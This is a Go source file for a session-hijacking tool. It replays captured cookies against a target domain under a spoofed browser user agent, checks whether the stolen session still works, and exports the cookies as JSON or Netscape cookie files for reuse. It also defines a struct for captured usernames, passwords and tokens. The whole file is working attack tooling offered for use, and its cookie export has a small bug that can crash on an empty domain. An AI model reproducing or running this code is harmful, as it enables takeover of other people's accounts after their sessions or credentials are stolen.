package replay

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/cookiejar"
	"os"
	"time"
)

type SessionReplay struct {
	client    *http.Client
	cookies   []*http.Cookie
	userAgent string
	domain    string
}

type Session struct {
	ID         string        `json:"id"`
	Domain     string        `json:"domain"`
	Username   string        `json:"username"`
	Cookies    []*http.Cookie `json:"cookies"`
	Status     string        `json:"status"`
	CapturedAt time.Time     `json:"captured_at"`
	LastUsed   time.Time     `json:"last_used"`
}

type Credentials struct {
	Username  string            `json:"username"`
	Password  string            `json:"password"`
	Domain    string            `json:"domain"`
	Tokens    map[string]string `json:"tokens"`
	CapturedAt time.Time        `json:"captured_at"`
}

func NewSessionReplay(domain string, cookies []*http.Cookie) *SessionReplay {
	jar, _ := cookiejar.New(nil)
	return &SessionReplay{
		client: &http.Client{
			Jar:     jar,
			Timeout: 30 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		cookies:   cookies,
		domain:    domain,
		userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	}
}

func (s *SessionReplay) HijackSession(ctx context.Context) (*Session, error) {
	url := fmt.Sprintf("https://%s", s.domain)
	
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}
	
	for _, cookie := range s.cookies {
		req.AddCookie(cookie)
	}
	
	req.Header.Set("User-Agent", s.userAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	
	resp, err := s.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to execute request: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode == 200 || resp.StatusCode == 302 || resp.StatusCode == 301 {
		return &Session{
			Domain:     s.domain,
			Cookies:    s.cookies,
			Status:     "active",
			CapturedAt: time.Now(),
			LastUsed:   time.Now(),
		}, nil
	}
	
	return nil, fmt.Errorf("session invalid: status %d", resp.StatusCode)
}

func (s *SessionReplay) ExportCookiesJSON() ([]byte, error) {
	type CookieExport struct {
		Name     string    `json:"name"`
		Value    string    `json:"value"`
		Domain   string    `json:"domain"`
		Path     string    `json:"path"`
		Expires  time.Time `json:"expires"`
		HTTPOnly bool      `json:"http_only"`
		Secure   bool      `json:"secure"`
		SameSite string    `json:"same_site"`
	}
	
	var cookies []CookieExport
	for _, c := range s.cookies {
		sameSite := "Lax"
		switch c.SameSite {
		case http.SameSiteStrictMode:
			sameSite = "Strict"
		case http.SameSiteNoneMode:
			sameSite = "None"
		}
		
		cookies = append(cookies, CookieExport{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Path:     c.Path,
			Expires:  c.Expires,
			HTTPOnly: c.HttpOnly,
			Secure:   c.Secure,
			SameSite: sameSite,
		})
	}
	
	return json.MarshalIndent(cookies, "", "  ")
}

func (s *SessionReplay) ExportCookiesNetscape() []byte {
	var output []byte
	output = append(output, []byte("# Netscape HTTP Cookie File\n")...)
	output = append(output, []byte("# https://curl.se/docs/http-cookies.html\n\n")...)
	
	for _, c := range s.cookies {
		domain := c.Domain
		if domain == "" {
			domain = s.domain
		}
		
		includeSubdomains := "TRUE"
		if c.Domain[0] != '.' {
			includeSubdomains = "FALSE"
			domain = "." + domain
		}
		
		path := c.Path
		if path == "" {
			path = "/"
		}
		
		expire := int64(0)
		if !c.Expires.IsZero() {
			expire = c.Expires.Unix()
		}
		
		secure := "FALSE"
		if c.Secure {
			secure = "TRUE"
		}
		
		line := fmt.Sprintf("%s\t%s\t%s\t%d\t%s\t%s\t%s\n",
			domain, includeSubdomains, path, expire, secure, c.Name, c.Value)
		output = append(output, []byte(line)...)
	}
	
	return output
}

func (s *SessionReplay) ExportToFile(filename string, format string) error {
	var data []byte
	var err error
	
	switch format {
	case "json":
		data, err = s.ExportCookiesJSON()
	case "netscape":
		data = s.ExportCookiesNetscape()
	default:
		return fmt.Errorf("unsupported format: %s", format)
	}
	
	if err != nil {
		return err
	}
	
	return os.WriteFile(filename, data, 0644)
}
